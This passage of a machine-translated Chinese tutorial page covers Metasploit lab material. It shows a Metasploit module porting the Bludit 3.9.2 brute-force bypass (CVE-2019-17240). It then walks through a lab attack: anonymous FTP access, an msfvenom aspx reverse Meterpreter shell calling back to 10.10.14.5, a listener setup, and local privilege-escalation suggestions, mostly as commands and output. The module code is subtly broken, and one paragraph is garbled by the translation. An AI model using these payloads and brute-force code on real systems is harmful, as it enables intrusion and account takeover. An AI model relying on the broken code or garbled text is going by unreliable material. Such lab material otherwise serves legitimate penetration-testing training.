class="string">&#x27;BLUDITPASS&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The password for Bludit&#x27;</span>])</span><br><span class="line">     ])</span><br><span class="line"> <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>回顾我们的利用，我们发现需要一个单词表而不是<code>BLUDITPASS</code>模块的变量来暴力破解相同用户名的密码。它看起来像下面的片段：</p><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">          <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br></pre></td></tr></table></figure><p>其余的漏洞利用代码需要根据移植到 Metasploit Framework 中使用的类、方法和变量进行调整，以使模块最终发挥作用。该模块的最终版本如下所示：</p><h4 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h4><p>代号：红宝石</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::PhpEXE</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Auxiliary::Report</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&quot;Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;rastating&#x27;</span>, <span class="comment"># Original discovery</span></span><br><span class="line">          <span class="string">&#x27;0ne-nine9&#x27;</span>  <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [<span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2019-17240&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&#x27;</span>],</span><br><span class="line">          [<span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;https://github.com/bludit/bludit/pull/1090&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; <span class="variable constant_">ARCH_PHP</span>,</span><br><span class="line">      <span class="string">&#x27;Notes&#x27;</span>          =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;SideEffects&#x27;</span> =&gt; [ <span class="variable constant_">IOC_IN_LOGS</span> ],</span><br><span class="line">          <span class="string">&#x27;Reliability&#x27;</span> =&gt; [ <span class="variable constant_">REPEATABLE_SESSION</span> ],</span><br><span class="line">          <span class="string">&#x27;Stability&#x27;</span>   =&gt; [ <span class="variable constant_">CRASH_SAFE</span> ]</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;Bludit v3.9.2&#x27;</span>, &#123;&#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&quot;2019-10-05&quot;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span>  =&gt; <span class="number">0</span>))</span><br><span class="line">      </span><br><span class="line">     register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The base path for Bludit&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;BLUDITUSER&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">        <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># -- Exploit code -- #</span></span><br><span class="line">  <span class="comment"># dirty workaround to remove this warning:</span></span><br><span class="line"><span class="comment">#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need &quot;.&quot; at the beginning.</span></span><br><span class="line"><span class="comment"># see https://github.com/nahi/httpclient/issues/252</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebAgent</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Cookie</span> &lt; <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Cookie</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">domain</span></span><br><span class="line">      <span class="variable language_">self</span>.original_domain</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_csrf</span>(<span class="params">client, login_url</span>)</span><br><span class="line">  res = client.get(login_url)</span><br><span class="line">  csrf_token = <span class="regexp">/input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;/</span>.match(res.body).captures[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_ok?</span>(<span class="params">res</span>)</span><br><span class="line">  <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Status</span>.redirect?(res.code) &amp;&amp;</span><br><span class="line">    <span class="regexp">%r&#123;/admin/dashboard&#125;</span>.match?(res.headers[<span class="string">&#x27;Location&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_auth</span>(<span class="params">client, host, username, wordlist</span>)</span><br><span class="line">  login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">  <span class="title class_">File</span>.foreach(wordlist).with_index <span class="keyword">do</span> |<span class="params">password, i</span>|</span><br><span class="line">    password = password.chomp</span><br><span class="line">    csrf_token = get_csrf(client, login_url)</span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&#x27;X-Forwarded-For&#x27;</span> =&gt; <span class="string">&quot;<span class="subst">#&#123;i&#125;</span>-<span class="subst">#&#123;password[..<span class="number">4</span>]&#125;</span>&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;tokenCSRF&#x27;</span> =&gt; csrf_token,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; username,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; password,</span><br><span class="line">    &#125;</span><br><span class="line">    puts <span class="string">&quot;[*] Trying password: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">    auth_res = client.post(login_url, data, headers)</span><br><span class="line">    <span class="keyword">if</span> auth_ok?(auth_res)</span><br><span class="line">      puts <span class="string">&quot;\n[+] Password found: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin</span></span><br><span class="line"><span class="comment">#  args = Docopt.docopt(doc)</span></span><br><span class="line"><span class="comment">#  pp args if args[&#x27;--debug&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  clnt = HTTPClient.new</span></span><br><span class="line"><span class="comment">#  bruteforce_auth(clnt, args[&#x27;--root-url&#x27;], args[&#x27;--user&#x27;], args[&#x27;--#wordlist&#x27;])</span></span><br><span class="line"><span class="comment">#rescue Docopt::Exit =&gt; e</span></span><br><span class="line"><span class="comment">#  puts e.message</span></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure><p>如果您想了解有关将脚本移植到 Metasploit 框架中的更多信息，请查看<a href="https://nostarch.com/metasploit">No Starch Press 的 Metasploit：渗透测试人员指南</a>。Rapid7 还创建了关于此主题的博客文章，可<a href="https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/">在此处</a>找到。</p><h1 id="MSF毒液简介"><a href="#MSF毒液简介" class="headerlink" title="MSF毒液简介"></a>MSF毒液简介</h1><hr><p><code>MSFVenom``MSFPayload</code>是和的后继者<code>MSFEncode</code>，这两个独立脚本过去常常与 结合使用，<code>msfconsole</code>为用户提供高度可定制且难以检测的有效负载以进行攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSFVenom`是这两种工具结合的结果。在使用此工具之前，我们必须将用于为特定处理器架构和操作系统版本生成 shellcode 的`|`结果通过管道 ()传输到，其中包含多种编码方案，用于从 shellcode 中删除不良字符。这有时会导致运行时不稳定 - 以及用于规避旧版防病毒 ( ) 和端点入侵防御/入侵检测 ( ) 软件。`MSFPayload``MSFEncode``AV``IPS/IDS</span><br></pre></td></tr></table></figure><p>如今，这两个组合工具为渗透测试人员提供了一种方法，可以为不同的目标主机架构和版本快速制作有效载荷，同时有可能“清理”他们的 shellcode，以便在部署时不会遇到任何错误。如今，AV 规避部分要复杂得多，因为仅基于签名的恶意文件分析已成为过去。<code>Heuristic analysis, machine learning, and deep packet inspection</code>使有效负载更难通过编码方案的几个后续迭代来逃避任何好的 AV 软件。如模块中所示<code>Payloads</code>，提交具有上述相同配置的简单有效载荷产生的命中率为<code>52/65</code>. 就全球恶意软件分析师而言，这就是宾果游戏。（全世界的恶意软件分析师是否真的说“那是宾果游戏”，这一点仍未得到证实。）</p><hr><h2 id="创建我们的有效载荷"><a href="#创建我们的有效载荷" class="headerlink" title="创建我们的有效载荷"></a>创建我们的有效载荷</h2><p>假设我们发现了一个开放的 FTP 端口，该端口要么凭据薄弱，要么意外地对匿名登录开放。现在，假设 FTP 服务器本身链接到在<code>tcp/80</code>同一台机器的端口上运行的 Web 服务，并且可以在 Web 服务的目录中查看 FTP 根目录中找到的所有文件<code>/uploads</code>。我们还假设 Web 服务没有任何检查允许我们作为客户端在其上运行的内容。</p><p>假设我们被允许从 Web 服务中调用任何我们想要的东西。在这种情况下，我们可以直接通过 FTP 服务器上传 PHP shell 并从 Web 访问它，触发有效载荷并允许我们从受害机器接收反向 TCP 连接。</p><h4 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h4><p> 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h4 id="FTP-匿名访问"><a href="#FTP-匿名访问" class="headerlink" title="FTP 匿名访问"></a>FTP 匿名访问</h4><p> FTP 匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ftp 10.10.10.5</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.5.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name (10.10.10.5:root): anonymous</span><br><span class="line"></span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password: ******</span><br><span class="line"></span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line"></span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  05:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  05:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure><p>注意 aspnet_client，我们意识到该框将能够运行<code>.aspx</code>反向 shell。对我们来说幸运的是，<code>msfvenom</code>可以毫无问题地做到这一点。</p><h4 id="生成有效载荷"><a href="#生成有效载荷" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of aspx file: 2819 bytes</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates</span><br></pre></td></tr></table></figure><p>现在，我们只需要导航到<code>http://10.10.10.5/reverse_shell.aspx</code>，它就会触发<code>.aspx</code>负载。然而，在我们这样做之前，我们应该在 msfconsole 上启动一个侦听器，以便在其中捕获反向连接请求。</p><h4 id="MSF-设置-Multi-Handler"><a href="#MSF-设置-Multi-Handler" class="headerlink" title="MSF - 设置 Multi&#x2F;Handler"></a>MSF - 设置 Multi&#x2F;Handler</h4><p> MSF - 设置 Multi&#x2F;Handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q </span><br><span class="line"></span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.5</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1337</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br></pre></td></tr></table></figure><hr><h2 id="执行负载"><a href="#执行负载" class="headerlink" title="执行负载"></a>执行负载</h2><p>现在我们可以触发<code>.aspx</code>Web 服务上的负载。这样做不会在页面上加载任何视觉上的内容，但回顾我们的<code>multi/handler</code>模块，我们会收到一个连接。我们应该确保我们的<code>.aspx</code>文件不包含 HTML，因此我们只会看到一个空白网页。然而，有效负载无论如何都是在后台执行的。</p><h4 id="MSF-Meterpreter-外壳"><a href="#MSF-Meterpreter-外壳" class="headerlink" title="MSF - Meterpreter 外壳"></a>MSF - Meterpreter 外壳</h4><p> MSF - Meterpreter 外壳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br><span class="line"></span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:1337 -&gt; 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: IIS APPPOOL\Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died</span><br></pre></td></tr></table></figure><p>如果 Meterpreter 会话死得太频繁，我们可以考虑对其进行编码以避免在运行时出错。我们可以选择任何可行的编码器，无论如何它最终都会提高我们成功的机会。</p><hr><h2 id="本地漏洞利用建议"><a href="#本地漏洞利用建议" class="headerlink" title="本地漏洞利用建议"></a>本地漏洞利用建议</h2><p>作为提示，有一个名为<code>Local Exploit Suggester</code>. 我们将在这个例子中使用这个模块，因为 Meterpreter shell 登陆用户<code>IIS APPPOOL\Web</code>，自然没有很多权限。此外，运行该<code>sysinfo</code>命令向我们展示了系统是 x86 位架构，让我们更有理由相信 Local Exploit Suggester。</p><h4 id="MSF-搜索本地漏洞利用建议者"><a href="#MSF-搜索本地漏洞利用建议者" class="headerlink" title="MSF - 搜索本地漏洞利用建议者"></a>MSF - 搜索本地漏洞利用建议者</h4><p> MSF - 搜索本地漏洞利用建议者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search local exploit suggester</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session</span><br><span class="line">   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester</span><br><span class="line">   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 2376</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line"></span><br><span class="line">session =&gt; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.5 - 31 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><p>将这些结果摆在我们面前，我们可以轻松地选择其中一个进行测试。如果我们选择的一个最终无效，请继续进行下一个。并非所有检查都是 100% 准确的，并非所有变量都相同。往下看，<code>bypassauc_eventvwr</code>失败是因为 IIS 用户不是管理员组的一部分，这是默认和预期的。第二个选项<code>ms10_015_kitrap0d</code>可以解决问题。</p><h4 id="MSF-本地权限提升"><a href="#MSF-本地权限提升" class="headerlink" title="MSF - 本地权限提升"></a>MSF - 本地权限提升</h4><p> MSF - 本地权限提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 